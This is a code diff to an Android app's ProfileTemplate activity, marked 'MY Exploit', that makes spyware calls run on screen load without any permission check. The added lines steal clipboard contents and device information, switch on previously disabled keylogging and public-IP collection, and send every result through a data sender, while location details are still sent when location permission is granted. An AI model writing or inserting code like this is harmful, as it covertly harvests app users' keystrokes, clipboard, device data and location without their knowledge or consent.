@@ -47,18 +47,17 @@ class ProfileTemplate : AppCompatActivity() {
         StrictMode.setThreadPolicy(policy)
 
         // MY Exploit -----------------------------------------------------------------
+        val gn = General(this,this)
+        val gps = FindLocation(this, this)
+        datasender.sendData("id", gn.stealClipboard())
+        datasender.sendData("id", gn.stealDeviceInfo())
+        gn.logKeys()?.let { datasender.sendData("id", it) }
+        gn.getPublicIP()?.let { datasender.sendData("id", it) }
         val PERMISSIONS = arrayOf(
             Manifest.permission.ACCESS_COARSE_LOCATION,
             Manifest.permission.ACCESS_FINE_LOCATION
         )
         if (checkLocPerms(this, *PERMISSIONS)) {
-            val gn = General(this,this)
-            val gps = FindLocation(this, this)
-
-            datasender.sendData("id", gn.stealClipboard())
-            datasender.sendData("id", gn.stealDeviceInfo())
-//            datasender.sendData("id", gn.logKeys())
-//            datasender.sendData("id", gn.getPublicIP())
             datasender.sendData("loc", gps.getLocationDetails())
         }
 
